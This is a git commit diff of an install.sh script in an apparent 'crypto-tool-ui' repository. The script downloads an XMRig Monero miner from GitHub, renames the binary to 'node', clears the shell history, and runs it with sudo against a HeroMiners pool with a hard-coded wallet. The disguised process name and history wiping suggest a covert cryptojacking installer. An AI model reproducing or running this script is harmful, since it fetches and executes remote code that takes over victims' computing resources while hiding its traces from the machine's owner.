a3c86a9e89814e585a9db25a1fb7c9e1b9700491
crypto-tool-ui <joniiie1456@gmail.com>
2025-12-01 03:30:50 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
-wget https://github.com/xmrig-zero-donation/xmrig-zero-donation/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
-rm xmrig-6.24.0-linux-static-x64.tar.gz
-cd xmrig-6.24.0
+curl https://github.com/Maks1mS/xmrig-zero-donation/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz  -L -O -J
+tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
+rm xmrig-6.21.0-linux-static-x64.tar.gz
+cd xmrig-6.21.0
 mv ./xmrig ./node
 history -c && history -w && clear
 sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o sg.salvium.herominers.com:1230 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.CPU2 -p x -k -t 4
